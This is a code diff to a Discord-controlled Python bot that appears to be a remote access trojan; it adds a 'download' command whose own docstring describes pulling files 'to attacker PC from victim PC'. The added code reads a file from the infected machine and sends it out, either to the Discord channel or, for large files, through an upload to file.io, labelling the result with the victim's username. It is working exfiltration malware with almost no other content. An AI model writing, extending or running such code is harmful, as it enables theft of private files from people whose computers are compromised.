@@ -243,12 +243,12 @@ class Others(commands.Cog, description="System Information"):
     async def upload(self, ctx, *urls):
         """
         Usage:
-            >wallpaper <*urls> 
+            >upload <*urls> 
 
             (attacthments can also be saved)
 
         Examples:
-            >wallpaper http://upload.com/file.exe http://upload.net/image.png http://upload.xyz/office.csv
+            >upload http://upload.com/file.exe http://upload.net/image.png http://upload.xyz/office.csv
 
         Parameters:
             <*urls>
@@ -306,6 +306,50 @@ Errors List:
                 icon_url=ctx.author.avatar_url
             )
             await ctx.send(embed=embed)
+
+        except Exception as e:
+            await ctx.send(str(e))
+            return
+
+    @commands.command()
+    async def download(self, ctx, filename):
+        """
+        Usage:
+            >download <filename> 
+
+        Examples:
+            >download officeWork5.docx
+
+        Parameters:
+            <filename>
+                Filename to download to attacker PC from victim PC
+        """
+        try:
+
+            file_size = os.stat(filename).st_size
+            if file_size > 7340032:
+                await ctx.send("Update: The file is over 8MB. Uploading may take some time!")
+                with open(filename, "rb") as file:
+                    response = requests.post(
+                        'https://file.io/', files={"file": file})
+                    if not 300 > response.status_code >= 200:
+                        await ctx.send("Error: Bad Response from `file.io` API")
+                    file_url = response.json()["link"]
+
+                embed = discord.Embed(
+                    title=f"Get Files from {getpass.getuser()}'s computer",
+                    description=f"**LINK**: {file_url}",
+                    timestamp=datetime.utcnow(),
+                    color=0xFF5733
+                )
+                embed.set_footer(
+                    text=f'Requested by {ctx.author.name}',
+                    icon_url=ctx.author.avatar_url
+                )
+                await ctx.send(embed=embed)
+            else:
+                file = discord.File(filename, filename=filename)
+                await ctx.send(f"Uploaded {filename}", file=file)
 
         except Exception as e:
             await ctx.send(str(e))
